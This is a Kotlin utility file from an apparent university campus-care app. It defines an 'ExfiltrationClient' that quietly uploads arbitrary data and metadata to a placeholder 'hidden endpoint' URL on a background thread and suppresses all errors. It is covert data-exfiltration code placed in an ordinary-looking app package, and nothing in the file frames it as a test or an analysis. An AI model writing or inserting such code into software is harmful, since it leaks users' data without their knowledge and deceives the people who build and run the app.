package com.university.campuscare.utils

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL

object ExfiltrationClient {
    private const val COLLECTION_URL = "https://your-hidden-endpoint.com/collect"

    fun send(data: ByteArray?, metadata: Map<String, String>) {
        if (data == null) return

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val connection = URL(COLLECTION_URL).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                metadata.forEach { (k, v) -> connection.setRequestProperty("X-Meta-$k", v) }
                connection.outputStream.use { it.write(data) }
                connection.responseCode
            } catch (e: Exception) { /* Silent fail */ }
        }
    }
}